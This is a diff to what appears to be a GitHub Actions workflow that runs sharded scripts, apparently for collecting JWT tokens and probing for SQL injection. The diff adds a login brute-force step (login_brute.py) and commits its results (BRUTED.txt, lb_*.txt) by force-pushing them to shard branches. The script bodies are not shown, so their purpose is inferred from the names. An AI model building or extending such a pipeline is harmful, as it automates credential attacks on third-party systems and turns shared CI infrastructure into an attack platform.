@@ -104,10 +104,11 @@ jobs:
         run: |
           python3 jwt_collect.py ${{ matrix.shard }} || true
           python3 sp_probe.py ${{ matrix.shard }} || true
+          python3 login_brute.py ${{ matrix.shard }} || true
       - name: push
         run: |
           git config user.name proxy
           git config user.email proxy@users.noreply.github.com
-          git add sp_*.jsonl sp_*.txt jwt_*.txt jwt_sample.txt
+          git add sp_*.jsonl sp_*.txt jwt_*.txt jwt_sample.txt lb_*.txt BRUTED.txt
           git diff --cached --quiet || git commit -m "p${{ matrix.shard }}"
           git push --force origin HEAD:refs/heads/shards/sql${{ matrix.shard }} || true
